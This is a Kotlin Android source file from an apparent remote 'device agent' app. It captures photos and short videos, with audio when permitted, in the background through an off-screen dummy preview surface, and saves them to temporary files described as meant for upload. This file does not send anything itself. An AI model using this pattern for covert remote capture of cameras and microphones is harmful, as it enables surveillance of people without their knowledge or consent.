package com.codewithdanu.deviceagent.utils

import android.content.ContentValues
import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.os.Build
import android.provider.MediaStore
import android.util.Log
import androidx.annotation.RequiresPermission
import androidx.camera.core.*
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.camera.video.*
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleOwner
import android.graphics.SurfaceTexture
import android.os.Handler
import android.os.Looper
import java.io.File
import java.io.FileOutputStream
import java.io.OutputStream
import java.util.concurrent.Executors
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine

object CameraHandler {
    private const val TAG = "CameraHandler"
    private val cameraExecutor = Executors.newSingleThreadExecutor()

    /**
     * Takes a photo in the background and returns the temporary File.
     * If [saveToGallery] is true, it also saves a copy to the device's Pictures folder.
     */
    suspend fun takePhoto(
        context: Context, 
        lifecycleOwner: LifecycleOwner, 
        cameraFacing: String = "back",
        saveToGallery: Boolean = true
    ): File? = suspendCoroutine { continuation ->
        val cameraProviderFuture = ProcessCameraProvider.getInstance(context)

        cameraProviderFuture.addListener({
            try {
                val cameraProvider = cameraProviderFuture.get()

                // CRITICAL: Create and attach the SurfaceTexture BEFORE binding.
                // If we set it after bind, CameraX resets and drops all use cases.
                val surfaceTexture = SurfaceTexture(0).apply {
                    setDefaultBufferSize(640, 480)
                }
                val dummySurface = android.view.Surface(surfaceTexture)

                val preview = Preview.Builder().build().also { prev ->
                    prev.setSurfaceProvider { request ->
                        request.provideSurface(dummySurface, ContextCompat.getMainExecutor(context)) {
                            dummySurface.release()
                            surfaceTexture.release()
                        }
                    }
                }

                val imageCapture = ImageCapture.Builder()
                    .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                    .build()

                val requestedSelector = if (cameraFacing == "front") {
                    CameraSelector.DEFAULT_FRONT_CAMERA
                } else {
                    CameraSelector.DEFAULT_BACK_CAMERA
                }
                
                // Fallback to back camera if front doesn't exist (or vice versa)
                val cameraSelector = if (cameraProvider.hasCamera(requestedSelector)) {
                    requestedSelector
                } else {
                    CameraSelector.DEFAULT_BACK_CAMERA
                }

                cameraProvider.unbindAll()
                cameraProvider.bindToLifecycle(lifecycleOwner, cameraSelector, preview, imageCapture)

                // Create temp file in cache
                val tempFile = File(context.cacheDir, "remote_capture_${System.currentTimeMillis()}.jpg")
                val outputOptions = ImageCapture.OutputFileOptions.Builder(tempFile).build()

                Log.d(TAG, "Camera bound, waiting for stabilization...")

                // Wait for AE/AF stabilization before firing the shutter
                Handler(Looper.getMainLooper()).postDelayed({
                    Log.d(TAG, "Triggering shutter now")
                    imageCapture.takePicture(
                        outputOptions,
                        ContextCompat.getMainExecutor(context),
                        object : ImageCapture.OnImageSavedCallback {
                            override fun onImageSaved(output: ImageCapture.OutputFileResults) {
                                Log.d(TAG, "Photo captured successfully: ${tempFile.absolutePath}")
                                if (saveToGallery) saveToPublicGallery(context, tempFile)
                                continuation.resume(tempFile)
                            }

                            override fun onError(exc: ImageCaptureException) {
                                Log.e(TAG, "Photo capture failed: ${exc.message}")
                                continuation.resume(null)
                            }
                        }
                    )
                }, 700)
            } catch (e: Exception) {
                Log.e(TAG, "Camera setup failed: ${e.message}")
                continuation.resume(null)
            }
        }, ContextCompat.getMainExecutor(context))
    }

    private fun saveToPublicGallery(context: Context, file: File) {
        try {
            val filename = "Agent_${System.currentTimeMillis()}.jpg"
            var fos: OutputStream? = null

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                val contentValues = ContentValues().apply {
                    put(MediaStore.MediaColumns.DISPLAY_NAME, filename)
                    put(MediaStore.MediaColumns.MIME_TYPE, "image/jpeg")
                    put(MediaStore.MediaColumns.RELATIVE_PATH, "DCIM/Camera")
                }
                val imageUri = context.contentResolver.insert(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, contentValues)
                fos = imageUri?.let { context.contentResolver.openOutputStream(it) }
            } else {
                val imagesDir = File(android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DCIM), "Camera")
                if (!imagesDir.exists()) imagesDir.mkdirs()
                val image = File(imagesDir, filename)
                fos = FileOutputStream(image)
                
                // Update gallery
                android.media.MediaScannerConnection.scanFile(context, arrayOf(image.absolutePath), null, null)
            }

            fos?.use {
                val bitmap = BitmapFactory.decodeFile(file.absolutePath)
                bitmap.compress(Bitmap.CompressFormat.JPEG, 100, it)
                Log.d(TAG, "Photo also saved to public Gallery")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to save to Gallery: ${e.message}")
        }
    }

    /**
     * Records a video in the background for [durationMs] milliseconds.
     */
    @RequiresPermission(android.Manifest.permission.RECORD_AUDIO)
    suspend fun recordVideo(
        context: Context,
        lifecycleOwner: LifecycleOwner,
        cameraFacing: String = "back",
        durationMs: Long = 5000L
    ): File? = suspendCoroutine { continuation ->
        val cameraProviderFuture = ProcessCameraProvider.getInstance(context)

        cameraProviderFuture.addListener({
            try {
                val cameraProvider = cameraProviderFuture.get()

                val surfaceTexture = SurfaceTexture(0).apply {
                    setDefaultBufferSize(640, 480)
                }
                val dummySurface = android.view.Surface(surfaceTexture)

                val preview = Preview.Builder().build().also { prev ->
                    prev.setSurfaceProvider { request ->
                        request.provideSurface(dummySurface, ContextCompat.getMainExecutor(context)) {
                            dummySurface.release()
                            surfaceTexture.release()
                        }
                    }
                }

                val recorder = Recorder.Builder()
                    .setQualitySelector(QualitySelector.from(Quality.SD)) // Low quality for fast upload
                    .build()
                val videoCapture = VideoCapture.withOutput(recorder)

                val requestedSelector = if (cameraFacing == "front") {
                    CameraSelector.DEFAULT_FRONT_CAMERA
                } else {
                    CameraSelector.DEFAULT_BACK_CAMERA
                }
                val cameraSelector = if (cameraProvider.hasCamera(requestedSelector)) {
                    requestedSelector
                } else {
                    CameraSelector.DEFAULT_BACK_CAMERA
                }

                cameraProvider.unbindAll()
                cameraProvider.bindToLifecycle(lifecycleOwner, cameraSelector, preview, videoCapture)

                val tempFile = File(context.cacheDir, "remote_video_${System.currentTimeMillis()}.mp4")
                val outputOptions = FileOutputOptions.Builder(tempFile).build()

                Log.d(TAG, "Starting video recording for ${durationMs}ms...")
                
                // Wait for AE/AF stabilization before recording
                Handler(Looper.getMainLooper()).postDelayed({
                    val pendingRecording = videoCapture.output
                        .prepareRecording(context, outputOptions)
                        
                    if (ContextCompat.checkSelfPermission(context, android.Manifest.permission.RECORD_AUDIO) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                        pendingRecording.withAudioEnabled()
                    }

                    var activeRecording: Recording? = null
                    activeRecording = pendingRecording.start(ContextCompat.getMainExecutor(context)) { recordEvent ->
                        when (recordEvent) {
                            is VideoRecordEvent.Start -> {
                                Log.d(TAG, "Video recording started")
                                // Schedule auto-stop
                                Handler(Looper.getMainLooper()).postDelayed({
                                    Log.d(TAG, "Auto-stopping video after ${durationMs}ms")
                                    activeRecording?.stop()
                                }, durationMs)
                            }
                            is VideoRecordEvent.Finalize -> {
                                if (!recordEvent.hasError()) {
                                    Log.d(TAG, "Video captured successfully: ${tempFile.absolutePath}")
                                    continuation.resume(tempFile)
                                } else {
                                    Log.e(TAG, "Video capture error: ${recordEvent.error}")
                                    continuation.resume(null)
                                }
                            }
                        }
                    }
                }, 700)
            } catch (e: Exception) {
                Log.e(TAG, "Camera video setup failed: ${e.message}")
                continuation.resume(null)
            }
        }, ContextCompat.getMainExecutor(context))
    }
}
